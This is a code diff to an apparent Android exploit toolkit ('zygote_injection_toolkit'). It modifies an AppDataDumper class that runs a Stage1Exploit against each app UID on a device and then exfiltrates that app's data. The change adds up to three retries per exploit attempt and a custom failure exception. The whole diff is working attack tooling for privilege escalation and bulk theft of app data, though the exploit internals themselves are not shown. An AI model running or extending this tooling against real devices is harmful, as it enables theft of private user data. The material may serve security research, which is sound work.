@@ -5,6 +5,7 @@ from collections import defaultdict
 from io import BytesIO
 
 from zygote_injection_toolkit.device import Device
+from zygote_injection_toolkit.exceptions import ZygoteInjectionCommandFailedException
 from zygote_injection_toolkit.stage1 import Stage1Exploit
 
 
@@ -18,6 +19,9 @@ def swap_endianness(bytes_: bytes) -> bytes:
         result += read_bytes[::-1]
     return result
 
+
+class ExfilterationFailedException(Exception):
+    pass
 
 class AppDataDumper:
     def __init__(self, initialPort: int = 1234) -> None:
@@ -75,11 +79,24 @@ class AppDataDumper:
             percentage = (processed_uid_count / len(uid_pkg_map)) * 100
             print(f"[{percentage:.1f}%] Dumping UID {uid} on port {self.port} with package(s): '{"System" if (uid == 1000) else ', '.join(pkgs)}'")
         
-            exploit = Stage1Exploit(port=self.port, target_uid=uid, target_package=pkgs[0], silent=True)
+            try: 
+                exploit = Stage1Exploit(port=self.port, target_uid=uid, target_package=pkgs[0], silent=True)
+            except ZygoteInjectionCommandFailedException as e:
+                print(f"\tFailed to initialize exploit: {e}")
+                raise ExfilterationFailedException()
             
-            if not exploit.exploit_stage1():
-                failed_uid_pkg_map[uid] = pkgs
-                print("\tExploit failed")
+            attempts = 0
+            try:
+                while True:
+                    if not exploit.exploit_stage1():
+                        attempts += 1
+                        if attempts >= 3:
+                            failed_uid_pkg_map[uid] = pkgs
+                            print("\tExploit failed")
+                            raise ExfilterationFailedException()
+                    else:
+                        break
+            except ExfilterationFailedException:
                 continue
             
             if not self.exfilterate_data(pkgs):
